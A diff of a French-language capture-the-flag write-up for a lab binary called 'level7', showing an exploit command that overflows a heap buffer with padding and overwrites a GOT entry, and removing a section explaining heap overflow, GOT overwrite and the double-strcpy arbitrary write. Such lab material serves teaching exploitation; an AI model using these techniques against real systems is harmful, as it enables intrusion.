@@ -109,11 +109,3 @@ objdump -d ./level7 | grep "<m>"
 # Exploit
 ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 ```
-
----
-
-## Concepts clés
-
-- **Heap overflow** : `strcpy` sans vérification déborde d'un chunk vers le suivant
-- **GOT overwrite** : on écrase une entrée de la Global Offset Table pour rediriger un appel de fonction
-- **Double strcpy** : le 1er overflow contrôle la **destination** du 2ème strcpy → écriture arbitraire en mémoire
